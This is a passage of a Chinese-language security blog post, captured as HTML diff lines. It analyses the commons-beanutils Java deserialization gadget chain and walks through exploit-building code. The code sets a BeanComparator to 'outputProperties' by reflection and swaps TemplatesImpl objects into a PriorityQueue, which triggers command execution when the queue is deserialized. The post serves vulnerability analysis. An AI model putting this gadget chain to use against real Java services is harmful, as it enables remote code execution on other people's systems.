+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="kd">final</span> <span class="nc">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BeanComparator</span><span class="o">(</span><span class="s">"lowestSetBit"</span><span class="o">);</span>
+
+		<span class="c1">// create queue with numbers and basic comparator</span>
+		<span class="kd">final</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;(</span><span class="mi">2</span><span class="o">,</span> <span class="n">comparator</span><span class="o">);</span>
+</code></pre></div></div>
+<p>去看下 BeanComparator(在commons-beanutils 包，同时需要用到 commons-collections 包中的ComparableComparator)中的 compare():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="o">(</span> <span class="no">T</span> <span class="n">o1</span><span class="o">,</span> <span class="no">T</span> <span class="n">o2</span> <span class="o">)</span> <span class="o">{</span>
+
+    <span class="k">if</span> <span class="o">(</span> <span class="n">property</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// compare the actual objects</span>
+        <span class="k">return</span> <span class="nf">internalCompare</span><span class="o">(</span> <span class="n">o1</span><span class="o">,</span> <span class="n">o2</span> <span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">value1</span> <span class="o">=</span> <span class="nc">PropertyUtils</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span> <span class="n">o1</span><span class="o">,</span> <span class="n">property</span> <span class="o">);</span>
+        <span class="nc">Object</span> <span class="n">value2</span> <span class="o">=</span> <span class="nc">PropertyUtils</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span> <span class="n">o2</span><span class="o">,</span> <span class="n">property</span> <span class="o">);</span>
+        <span class="k">return</span> <span class="nf">internalCompare</span><span class="o">(</span> <span class="n">value1</span><span class="o">,</span> <span class="n">value2</span> <span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span> <span class="nc">IllegalAccessException</span> <span class="n">iae</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span> <span class="s">"IllegalAccessException: "</span> <span class="o">+</span> <span class="n">iae</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span> <span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span> <span class="nc">InvocationTargetException</span> <span class="n">ite</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span> <span class="s">"InvocationTargetException: "</span> <span class="o">+</span> <span class="n">ite</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span> <span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span> <span class="nc">NoSuchMethodException</span> <span class="n">nsme</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span> <span class="s">"NoSuchMethodException: "</span> <span class="o">+</span> <span class="n">nsme</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span> <span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>这里的关键在用 PropertyUtils.getProperty 来获取属性的值，比如这里它会去调用 o1.getProperty()，没有去跟它的具体实现了，但是可以用一小段代码来证明:
+<img src="https://i.loli.net/2017/08/17/59950c77b3c82.png" alt="" />
+只要 o1 为 TemplatesImpl，property 为 outputProperties 就可以触发 TemplatesImpl.GetoutputProperties()从而执行命令。使用 PropertyUtils.getProperty 需要 commons-logging 包，不然会抛出异常。
+接下来要做的就比较明确了，先添加正常的数据再通过反射去替换掉 queue 中的对象和 property，因为 PriorityQueue 不支持 non-comparable 对象，这里用到了 Java 的泛型的类型擦除。如果直接使用 queue.add 方法添加 template 会触发 Java 的 SecurityManager 安全机制，抛出异常:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="c1">// stub data for replacement later</span>
+		<span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+		<span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+
+		<span class="c1">// switch method called by comparator</span>
+		<span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">comparator</span><span class="o">,</span> <span class="s">"property"</span><span class="o">,</span> <span class="s">"outputProperties"</span><span class="o">);</span>
+
+		<span class="c1">// switch contents of queue</span>
+		<span class="kd">final</span> <span class="nc">Object</span><span class="o">[]</span> <span class="n">queueArray</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span> <span class="nc">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">"queue"</span><span class="o">);</span>
+		<span class="n">queueArray</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+		<span class="n">queueArray</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+
+		<span class="k">return</span> <span class="n">queue</span><span class="o">;</span>
+</code></pre></div></div>
+
+<h3 id="0x03-测试">0x03 测试</h3>
+<p><img src="https://i.loli.net/2017/08/17/59950c77cb15c.png" alt="" /></p>
+
+<h3 id="参考">参考</h3>
+<ul>
+  <li>https://drops.secquan.org/papers/14317</li>
+  <li>http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/</li>
+  <li>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</li>
+  <li>http://jboss-javassist.github.io/javassist/tutorial/tutorial.html</li>
+</ul>
+
+
+    </div>
+    
+    
+
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2015 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  </afooter>
+</div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed">
+  <a href="#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="/public/js/jquery.min.js"></script>
+<script src="/public/js/amazeui.min.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+var hm = document.createElement("script");
+hm.src = "//hm.baidu.com/hm.js?cff98725226896ccfb3b1634435b315c";
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</div>
+</body>
+</html>
